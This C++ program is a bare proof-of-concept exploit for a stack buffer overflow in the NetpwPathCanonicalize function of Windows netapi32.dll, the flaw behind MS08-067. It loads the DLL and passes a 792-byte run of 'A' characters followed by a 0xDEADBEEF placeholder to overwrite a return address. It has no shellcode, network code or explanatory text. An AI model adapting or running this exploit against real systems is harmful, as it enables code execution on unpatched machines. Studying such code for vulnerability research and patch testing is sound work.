#include <iostream>
#include <vector>
#include <windows.h>

typedef DWORD (WINAPI *MYPROC)
(
    LPSTR,      // szPath
    LPSTR,      // szCanPath
    DWORD,      // dwMaxBuffer
    LPSTR,      // szPrefix
    LPLONG,     // lPathType
    DWORD       // dwFlags
);

int main()
{
    char szPath[0x320];
    char szCanPath[0x440];
    DWORD dwMaxBuffer = 0x400;
    char szPrefix[0x100];
    LONG lPathType = 44;
    
    std::string exploit = "";
    exploit.append(792, 'A');
    exploit.append("\xEF\xBE\xAD\xDE");

    HINSTANCE hLib = NULL;
    MYPROC pfnNetpwPathCanonicalize = NULL;

    hLib = LoadLibrary("./netapi32.dll");
    if (NULL == hLib)
    {
        std::cerr << "LoadLibrary failed." << std::endl;
        return 1;
    }
    
    std::cout << "Library has been loaded" << std::endl;

    pfnNetpwPathCanonicalize = (MYPROC)GetProcAddress(hLib, "NetpwPathCanonicalize");
    if (NULL == pfnNetpwPathCanonicalize)
    {
        std::cerr << "GetProcAddress failed." << std::endl;
        FreeLibrary(hLib);
        return 1;
    }

    memset(szPath, 0, sizeof(szPath));
    memcpy(szPath, exploit.c_str(), exploit.size());
    
    memset(szPrefix, 0, sizeof(szPrefix));
    memset(szPrefix, 'b', sizeof(szPrefix) - 2);
    
    pfnNetpwPathCanonicalize(szPath, szCanPath, 0x400, szPrefix, &lPathType, 0);

    FreeLibrary(hLib);
    
    std::cout << "Free" << std::endl;

    return 0;
}